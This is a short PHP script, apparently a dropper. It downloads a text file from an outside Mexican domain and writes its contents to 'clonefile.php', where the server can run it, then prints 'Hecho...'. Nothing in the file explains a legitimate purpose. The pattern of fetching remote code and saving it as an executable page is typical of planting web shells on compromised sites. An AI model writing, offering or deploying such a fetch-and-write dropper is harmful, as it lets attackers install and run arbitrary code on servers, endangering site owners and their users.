<?php
$source =("https://www.eqns.com.mx/ConfiguracionesPHP/ExpoMexaba/Conexion.txt");
$destination = 'clonefile.php';

$data = file_get_contents($source);

$handle = fopen($destination, "w");
fwrite($handle, $data);
fclose($handle);
echo "Hecho...";
?>